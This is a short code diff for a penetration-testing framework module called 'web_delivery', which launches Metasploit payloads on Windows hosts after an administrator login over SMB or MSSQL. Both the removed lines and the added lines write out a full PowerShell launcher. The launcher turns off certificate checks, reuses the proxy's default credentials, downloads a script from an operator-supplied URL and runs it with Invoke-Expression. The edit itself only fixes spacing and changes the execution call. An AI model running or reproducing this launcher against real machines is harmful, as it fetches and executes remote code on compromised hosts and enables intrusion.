@@ -12,7 +12,7 @@ class CMEModule:
     name = 'web_delivery'
     description = 'Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module'
     supported_protocols = ['smb', 'mssql']
-    opsec_safe= True
+    opsec_safe = True
     multiple_hosts = True
 
     def options(self, context, module_options):
@@ -27,7 +27,6 @@ class CMEModule:
         self.url = module_options['URL']
 
     def on_admin_login(self, context, connection):
-        command = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');'''.format(self.url)
-        ps_command = create_ps_command(command, force_ps32=True)
-        connection.execute(ps_command)
+        ps_command = '''[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');'''.format(self.url)
+        connection.ps_execute(ps_command, force_ps32=True)
         context.log.success('Executed web-delivery launcher')
